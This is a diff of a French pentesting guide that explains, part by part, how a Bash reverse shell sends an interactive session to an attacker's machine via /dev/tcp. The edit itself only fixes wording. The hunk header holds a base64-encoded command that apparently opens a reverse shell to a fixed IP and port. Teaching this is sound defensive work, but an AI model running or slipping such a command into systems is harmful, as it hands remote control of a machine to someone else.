@@ -50,7 +50,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 1. **`bash -i`**: Cette partie de la commande démarre une shell Bash interactive (`-i`).
 2. **`>&`**: Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: C'est un fichier spécial qui **représente une connexion TCP à l'adresse IP et au port spécifiés**.
-* En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie effectivement la sortie de la session de shell interactive à la machine de l'attaquant.
+* En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie effectivement la sortie de la session shell interactive à la machine de l'attaquant.
 4. **`0>&1`**: Cette partie de la commande **redirige l'entrée standard (`stdin`) vers la même destination que la sortie standard (`stdout`)**.
 
 ### Créer dans le fichier et exécuter
